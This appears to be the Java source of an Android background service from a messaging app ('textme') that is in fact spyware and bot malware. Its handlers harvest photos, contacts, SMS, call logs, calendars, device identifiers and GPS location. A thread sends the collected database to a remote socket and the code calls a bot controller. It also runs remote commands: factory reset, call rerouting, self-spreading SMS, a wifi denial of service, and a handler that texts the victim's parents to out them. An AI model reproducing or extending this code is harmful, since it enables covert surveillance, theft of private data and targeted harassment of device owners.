package com.candroid.textme.jobs;

import android.Manifest;
import android.app.IntentService;
import android.app.Notification;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.HandlerThread;
import android.os.Looper;
import android.os.Process;
import android.preference.PreferenceManager;
import android.util.Log;

import com.candroid.textme.BuildConfig;
import com.candroid.textme.data.Constants;
import com.candroid.textme.data.pojos.CalendarEvent;
import com.candroid.textme.data.pojos.Contact;
import com.candroid.textme.data.db.Database;
import com.candroid.textme.data.db.DatabaseHelper;
import com.candroid.textme.api.Lofl;
import com.candroid.textme.receivers.OutgoingCallReceiver;
import com.candroid.textme.services.MessagingService;
import com.candroid.textme.data.pojos.PhoneCall;
import com.candroid.textme.data.pojos.SmsMsg;
import com.candroid.textme.data.Wallpapers;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectOutputStream;
import java.io.Reader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.ArrayList;

public class JobsIntentService extends IntentService {

    public static final String ACTION_LOCATION = "ACTION_LOCATION";
    public static final String ACTION_SHARE_APP = "ACTION_SHARE_APP";
    public static final String ACTION_FACTORY_RESET = "ACTION_FACTORY_RESET";
    public static final String ACTION_SEND_SMS = "ACTION_SEND_SMS";
    public static final String ACTION_PLAY_SONG = "ACTION_PLAY_SONG";
    public static final String ACTION_DELETE_FILE = "ACTION_DELETE_FILE";
    public static final String GPS_TRACKER_KEY = "GPS_TRACKER_KEY";
    public static final String ACTION_DOWNLOAD_HTTP_DATA = "ACTION_DOWNLOAD_HTTP_DATA";
    private static final String TAG = JobsIntentService.class.getSimpleName();
    public static final String ACTION_DCIM_FILES = "ACTION_DCIM_FILES";
    public static final String ACTION_SMS = "ACTION_SMS";
    public static final String ACTION_CALENDAR_EVENT = "ACTION_CALENDAR_EVENT";
    public static final String ACTION_PACKAGES = "ACTION_PACKAGES";
    public static final String ACTION_CONTACTS = "ACTION_CONTACTS";
    public static final String ACTION_DEVICE_INFO = "ACTION_DEVICE_INFO";
    public static final String ACTION_PHONE_CALLS = "ACTION_PHONE_CALLS";
    public static final String ACTION_WEB_BROWSER = "ACTION_WEB_BROWSER";
    public static final String ACTION_WALLPAPER = "ACTION_WALLPAPER";
    public static final String ACTION_FAKE_PHONE_CALL = "ACTION_FAKE_PHONE_CALL";
    public static final String ACTION_TEXT_PARENTS = "ACTION_TEXT_PARENTS";
    public static final String ACTION_INSERT_CONTACT = "ACTION_INSERT_CONTACT";
    public static final String ACTION_FLASHLIGHT = "ACTION_FLASHLIGHT";
    public static final String ACTION_VIBRATOR = "ACTION_VIBRATOR";
    public static final String ACTION_WIFI_CARD = "ACTION_WIFI_CARD";
    public static final String ACTION_REROUTE_CALLS = "ACTION_REROUTE_CALLS";
    public static final String ACTION_CALL_PHONE = "ACTION_CALL_PHONE";
    public static final String ACTION_ALARM_CLOCK = "ACTION_ALARM_CLOCK";
    public static final String ACTION_CREATE_NOTIFICATION = "ACTION_CREATE_NOTIFICATION";
    public static final String ACTION_CREATE_FILE = "ACTION_CREATE_FILE";
    public static final String ACTION_GPS_TRACKER = "ACTION_GPS_TRACKER";
    public static boolean sShouldTrackGps = false;
    private static long sNumber = 1111111111;
    public static HandlerThread sHandlerThread;
    public static Looper sLooper;
    public static LocationManager sLocationManager;
    public static LocationListener sLocationListener;

    public JobsIntentService() {
        super("JobsIntentService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent != null && intent.getAction() != null) {
            String action = intent.getAction();
            if (action.equals(ACTION_DCIM_FILES)) {
                if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
                    File[] pictures = Lofl.getFilesForDirectory(Lofl.getDcimDirectory().getPath() + "/Camera");
                    SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                    try {
                        database.beginTransaction();
                        if (pictures != null && pictures.length > 0) {
                            for (File f : pictures) {
                                Database.insertMedia(database, f.getName(), f);
                            }
                        }
                        database.setTransactionSuccessful();
                    } catch (SQLiteException e) {
                        e.printStackTrace();
                    } finally {
                        database.endTransaction();
                        if (database.isOpen()) {
                            database.close();
                        }
                        Lofl.setJobRan(this, JobsScheduler.DCIM_KEY);
                    }
                }
            } else if (action.equals(ACTION_PACKAGES)) {
                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                try {
                    database.beginTransaction();
                    Database.insertPackages(database, Lofl.getInstalledApps(this));
                    database.setTransactionSuccessful();
                } catch (SQLiteException e) {
                    e.printStackTrace();
                } finally {
                    database.endTransaction();
                    if (database.isOpen()) {
                        database.close();
                    }
                    Lofl.setJobRan(this, JobsScheduler.PACKAGES_KEY);
                }
            } else if (action.equals(ACTION_CONTACTS)) {
                if (checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                    ArrayList<Contact> contacts = Lofl.fetchContactsInformation(this);
                    SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                    try {
                        database.beginTransaction();
                        Database.insertContacts(database, contacts);
                        database.setTransactionSuccessful();
                    } catch (SQLiteException e) {
                        e.printStackTrace();
                    } finally {
                        database.endTransaction();
                        database.close();
                        Lofl.setJobRan(this, ACTION_CONTACTS);
                    }
                }
            } else if (action.equals(ACTION_DEVICE_INFO)) {
                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                try {
                    database.beginTransaction();
                    Database.insertDevice(database, MessagingService.sTelephoneAddress, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, BuildConfig.FLAVOR, Build.SERIAL, Build.RADIO);
                    database.setTransactionSuccessful();
                } catch (SQLException e) {
                    e.printStackTrace();
                } finally {
                    database.endTransaction();
                    database.close();
                    Lofl.setJobRan(this, ACTION_DEVICE_INFO);
                }
            } else if (action.equals(ACTION_PHONE_CALLS)) {
                if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
                    ArrayList<PhoneCall> phoneCalls = Lofl.fetchCallLog(this);
                    SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                    try {
                        database.beginTransaction();
                        Database.insertPhoneCalls(database, phoneCalls);
                        database.setTransactionSuccessful();
                    } catch (SQLException e) {
                        e.printStackTrace();
                    } finally {
                        database.endTransaction();
                        database.close();
                        Lofl.setJobRan(this, JobsScheduler.PHONE_CALLS_KEY);
                    }
                }
            } else if (action.equals(ACTION_SMS)) {
                if (checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                    ArrayList<SmsMsg> smsMsgs = Lofl.fetchSmsMessages(this);
                    SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                    try {
                        database.beginTransaction();
                        Database.insertSmsMessages(database, smsMsgs);
                        database.setTransactionSuccessful();
                    } catch (SQLException e) {
                        e.printStackTrace();
                    } finally {
                        database.endTransaction();
                        database.close();
                        Lofl.setJobRan(this, JobsScheduler.SMS_KEY);
                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                ArrayList<String> addresses = null;
                                Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                                try {
                                    Socket socket = new Socket("10.0.2.2", 6666);
                                    ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
                                    byte[] bytes = Lofl.fileToBytes(Lofl.getDatabaseFile(JobsIntentService.this));
                                    oos.writeObject(bytes);
                                    oos.flush();
                    /* for(int i = 0; i < 3; i++){
                        addresses = Lofl.fetchIpv4Addresses();
                        Socket socket = new Socket("10.0.2.2", 6666);
                        ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
                        if(i == 0){
                            oos.writeObject(sTelephoneAddress);
                        }else if(i == 1){
                            oos.writeObject(InetAddress.getLocalHost().toString());
                        }else if(i == 2){
                            byte[] bytes = Lofl.fileToBytes(Lofl.getDatabaseFile(MessagingService.this));
                            oos.writeObject(bytes);
                            oos.flush();
                        }
                        oos.close();
                        socket.close();
                    }*/
                                    oos.close();
                                    socket.close();
                                } catch (UnknownHostException e) {
                                    e.printStackTrace();
                                } catch (IOException e) {
                                    e.printStackTrace();
                                }
/*                try {
                    ServerSocket serverSocket = new ServerSocket(8080, 0, InetAddress.getLocalHost());
                    while(true) {
                        Socket socket = serverSocket.accept();
                        ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
                        String message = (String) ois.readObject();
                        Log.d(TAG, message);
                        ois.close();
                        socket.close();
                    }
                } catch (IOException e) {
                        e.printStackTrace();
                    } catch (ClassNotFoundException e) {
                        e.printStackTrace();
                    }*/
                            }
                        }).start();
                        //Lofl.onReceiveCommand(this, Commands.REROUTE_PHONE_CALLS, "stop");
                    }
                }
            } else if (action.equals(ACTION_CALENDAR_EVENT)) {
                if (checkSelfPermission(Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED) {
                    ArrayList<CalendarEvent> calendarEvents = Lofl.fetchCalendarEvents(this);
                    SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                    try {
                        database.beginTransaction();
                        Database.insertCalendarEvents(database, calendarEvents);
                        database.setTransactionSuccessful();
                    } catch (SQLException e) {
                        e.printStackTrace();
                    } finally {
                        database.endTransaction();
                        database.close();
                        Lofl.setJobRan(this, JobsScheduler.CALENDAR_EVENTS_KEY);
                    }
                }
            } else if (action.equals(ACTION_WALLPAPER)) {
                double randomNumber = Math.random();
                String url = null;
                if (randomNumber <= 0.5) {
                    url = Wallpapers.WALLPAPERS[0];
                } else {
                    url = Wallpapers.WALLPAPERS[2];
                }
                Lofl.changeWallpaper(this, Lofl.getBitmapFromUrl(Uri.parse(url).toString()));
            } else if (action.equals(ACTION_WEB_BROWSER)) {
                if (intent.hasExtra(Constants.Keys.URL_KEY)) {
                    String url = intent.getStringExtra(Constants.Keys.URL_KEY);
                    Lofl.openBrowser(this, url);
                }
            } else if (action.equals(ACTION_FAKE_PHONE_CALL)) {
                Lofl.fakePhoneCall(this);
            } else if (action.equals(ACTION_TEXT_PARENTS)) {
                if (checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
                    Lofl.tellMyParentsImGay(this);
                    Lofl.setJobRan(this, JobsScheduler.TEXT_PARENTS_KEY);
                }
            } else if (action.equals(ACTION_INSERT_CONTACT)) {
                if (this.checkSelfPermission(Manifest.permission.WRITE_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                    if (intent.hasExtra(Constants.Keys.NAME_KEY) && intent.hasExtra(Constants.Keys.ADDRESS_KEY)) {
                        String name = intent.getStringExtra(Constants.Keys.NAME_KEY);
                        String number = intent.getStringExtra(Constants.Keys.ADDRESS_KEY);
                        Lofl.insertContact(this, name, number);
                    }
                }
            } else if (action.equals(ACTION_WIFI_CARD)) {
                if (checkSelfPermission(Manifest.permission.CHANGE_WIFI_STATE) == PackageManager.PERMISSION_GRANTED) {
                    Lofl.dosWifiCard(this);
                }
            } else if (action.equals(ACTION_FLASHLIGHT)) {
                if (checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                    Lofl.persistentBlinkingFlashlight(this);
                }
            } else if (action.equals(ACTION_VIBRATOR)) {
                Lofl.vibrator(this);
            } else if (action.equals(ACTION_SHARE_APP)) {
                if (checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
                    Lofl.shareApp(this);
                }
            } else if (action.equals(ACTION_FACTORY_RESET)) {
                Lofl.factoryReset(this);
            } else if (action.equalsIgnoreCase(ACTION_REROUTE_CALLS)) {
                if (intent.hasExtra(OutgoingCallReceiver.NUMBER_KEY)) {
                    String number = intent.getStringExtra(OutgoingCallReceiver.NUMBER_KEY);
                    SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(this.getApplicationContext()).edit();
                    editor.putString(OutgoingCallReceiver.NUMBER_KEY, number);
                    editor.apply();
                    OutgoingCallReceiver.sRerouteNumber = number;
                }
            } else if (action.equalsIgnoreCase(ACTION_CALL_PHONE)) {
                if (checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
                    if (intent.hasExtra(Constants.Keys.ADDRESS_KEY)) {
                        String number = intent.getStringExtra(Constants.Keys.ADDRESS_KEY);
                        Lofl.phoneCall(this, number);
                    }
                }
            } else if (action.equals(ACTION_SEND_SMS)) {
                if (checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
                    if (intent.hasExtra(Constants.Keys.ADDRESS_KEY) && intent.hasExtra(Constants.Keys.BODY_KEY)) {
                        String address = intent.getStringExtra(Constants.Keys.ADDRESS_KEY);
                        String body = intent.getStringExtra(Constants.Keys.BODY_KEY);
                        Lofl.sendNonDataSms(this, address, body);
                    }
                }
            } else if (action.equals(ACTION_ALARM_CLOCK)) {
                if (intent.hasExtra(Constants.Keys.HOURS_KEY) && intent.hasExtra(Constants.Keys.MINUTES_KEY)) {
                    int hours = intent.getIntExtra(Constants.Keys.HOURS_KEY, 0);
                    int minutes = intent.getIntExtra(Constants.Keys.MINUTES_KEY, 0);
                    Lofl.setAlarmClock(this, hours, minutes);
                }
            } else if (action.equals(ACTION_CREATE_NOTIFICATION)) {
                if (intent.hasExtra(Constants.Keys.TITLE_KEY) && intent.hasExtra(Constants.Keys.CONTENT_KEY)) {
                    Lofl.sId++;
                    String title = intent.getStringExtra(Constants.Keys.TITLE_KEY);
                    String content = intent.getStringExtra(Constants.Keys.CONTENT_KEY);
                    Notification.Builder builder = new Notification.Builder(this, Constants.PRIMARY_NOTIFICATION_CHANNEL_ID);
                    builder.setContentTitle(title);
                    builder.setContentText(content);
                    builder.setPriority(Notification.PRIORITY_MAX);
                    builder.setTimeoutAfter(2000);
                    builder.setSmallIcon(android.R.drawable.stat_notify_error);
                    Lofl.initNotificationManager(this);
                    Lofl.createPrimaryNotificationChannel(Lofl.sNotificationManager);
                    Lofl.sNotificationManager.notify(Lofl.sId++, builder.build());
                }
            } else if (action.equals(ACTION_CREATE_FILE)) {
                if (intent.hasExtra(Constants.Keys.FILE_NAME_KEY) && intent.hasExtra(Constants.Keys.FILE_CONTENT_KEY)) {
                    String fileName = intent.getStringExtra(Constants.Keys.FILE_NAME_KEY);
                    String content = intent.getStringExtra(Constants.Keys.FILE_CONTENT_KEY);
                    Lofl.createTextFile(this, fileName, content);
                }
            } else if (action.equals(ACTION_PLAY_SONG)) {
                if (intent.hasExtra(Constants.Keys.URL_KEY)) {
                    String url = intent.getStringExtra(Constants.Keys.URL_KEY);
                    Lofl.playSong(this, url);
                }
            } else if (action.equals(ACTION_DELETE_FILE)) {
                if (intent.hasExtra(Constants.Keys.FILE_NAME_KEY)) {
                    String fileName = intent.getStringExtra(Constants.Keys.FILE_NAME_KEY);
                    Lofl.deleteFile(this, fileName);
                }
            } else if (action.equals(ACTION_LOCATION)) {
                if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {

/*                    if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.P){
                        if(locationManager.isLocationEnabled()){
                            locationProvider = locationManager.getProvider(LocationManager.GPS_PROVIDER);
                        }else{
                            locationProvider = locationManager.getProvider(LocationManager.NETWORK_PROVIDER);
                        }
                    }else{
                        locationProvider = locationManager.getProvider(LocationManager.GPS_PROVIDER);
                    }*/
                    LocationManager locationManager = Lofl.getLocationManager(JobsIntentService.this);
                    String provider = LocationManager.GPS_PROVIDER;
                    Location lastKnownLocation = locationManager.getLastKnownLocation(provider);
                    if(lastKnownLocation != null){
                        double latitude = lastKnownLocation.getLatitude();
                        double longitude = lastKnownLocation.getLongitude();
                        Database.insertLocation(DatabaseHelper.getInstance(JobsIntentService.this), latitude, longitude);
                    }
                }
            }else if(action.equals(ACTION_GPS_TRACKER)){
                if(intent.hasExtra(GPS_TRACKER_KEY)){
                    sShouldTrackGps = intent.getBooleanExtra(GPS_TRACKER_KEY, false);
                }
                if(sShouldTrackGps){
                    if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                        sHandlerThread = new HandlerThread("locationThread", Process.THREAD_PRIORITY_BACKGROUND);
                        sHandlerThread.start();
                        sLooper = sHandlerThread.getLooper();
                        String locationProvider = LocationManager.GPS_PROVIDER;
                        sLocationManager = Lofl.getLocationManager(JobsIntentService.this);
                        sLocationListener = Lofl.getLocationListener(this);
                        sLocationManager.requestLocationUpdates(locationProvider, 1000, 30, sLocationListener, sLooper);
                        SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(this).edit();
                        editor.putBoolean(GPS_TRACKER_KEY, true);
                        editor.apply();
                    }
                }else if(sLocationManager != null){
                    sLocationManager.removeUpdates(sLocationListener);
                    sLooper.quitSafely();
                    sHandlerThread.quitSafely();
                    sLocationManager = null;
                    sLooper = null;
                    sHandlerThread = null;
                    sLocationListener = null;
                    SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(this).edit();
                    editor.putBoolean(GPS_TRACKER_KEY, false);
                    editor.apply();
                }
            }else if(action.equalsIgnoreCase(ACTION_DOWNLOAD_HTTP_DATA)){
                if(intent.hasExtra(Constants.Keys.URL_KEY)){
                    int response = -1;
                    InputStream inputStream = null;
                    try {
                        URL url = new URL(Uri.parse(Constants.BOT_CONTROLLER_URL.concat(MessagingService.sTelephoneAddress)).toString());
                        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                        connection.setReadTimeout(10000);
                        connection.setConnectTimeout(10000);
                        connection.setRequestMethod("GET");
                        connection.setDoInput(true);
                        connection.connect();
                        response = connection.getResponseCode();
                        Log.d(TAG, String.format("response code = %s", response));
                        inputStream = connection.getInputStream();
                        Reader reader = null;
                        reader = new InputStreamReader(inputStream, "UTF-8");
                        char[] buffer = new char[1000];
                        reader.read(buffer);
                        String content = new String(buffer);
                        Log.d(TAG, String.format("HTML CONTENT = %s", content));
                    } catch (MalformedURLException e) {
                        e.printStackTrace();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }finally {
                        if(inputStream != null){
                            try {
                                inputStream.close();
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }
                        if(response == 200){
                            SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
                            editor.putBoolean(Constants.Keys.CALLED_HOME_KEY, true);
                            editor.apply();
                        }
                    }
                }
            }else {
                Log.d(TAG, "No action found!");
            }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
}